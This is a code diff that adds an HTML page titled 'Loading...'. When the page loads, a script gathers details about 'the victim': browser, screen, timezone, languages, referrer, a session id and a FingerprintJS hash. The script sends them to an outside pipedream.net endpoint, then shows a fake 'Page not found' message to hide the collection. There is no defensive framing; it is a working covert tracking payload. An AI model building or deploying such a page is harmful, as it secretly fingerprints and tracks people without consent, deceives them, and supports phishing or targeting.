@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.4/fingerprint2.min.js"></script>
+</head>
+<body>
+    <script>
+        // Get session ID from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('sid');
+        
+        // Collect information about the victim
+        function collectInfo() {
+            const info = {
+                sessionId: sessionId,
+                timestamp: new Date().toISOString(),
+                ip: '', // Will be filled by the server
+                userAgent: navigator.userAgent,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                languages: navigator.languages,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                referrer: document.referrer,
+                pageUrl: window.location.href
+            };
+            
+            // Get more detailed info if possible
+            if (window.Fingerprint2) {
+                Fingerprint2.get(function(components) {
+                    info.fingerprint = Fingerprint2.x64hash128(components.map(function(pair) { 
+                        return pair.value 
+                    }).join(), 31);
+                    sendInfo(info);
+                });
+            } else {
+                sendInfo(info);
+            }
+        }
+        
+        // Send information to the server
+        function sendInfo(info) {
+            axios.post('https://eolsd3wydxkm43e.m.pipedream.net', info)
+                .then(response => {
+                    // Redirect or show blank page after sending
+                    document.body.innerHTML = '<h1>Page not found</h1>';
+                })
+                .catch(error => {
+                    console.error('Error sending info:', error);
+                    document.body.innerHTML = '<h1>Error loading page</h1>';
+                });
+        }
+        
+        // Run collection when page loads
+        window.onload = collectInfo;
+    </script>
+</body>
+</html>
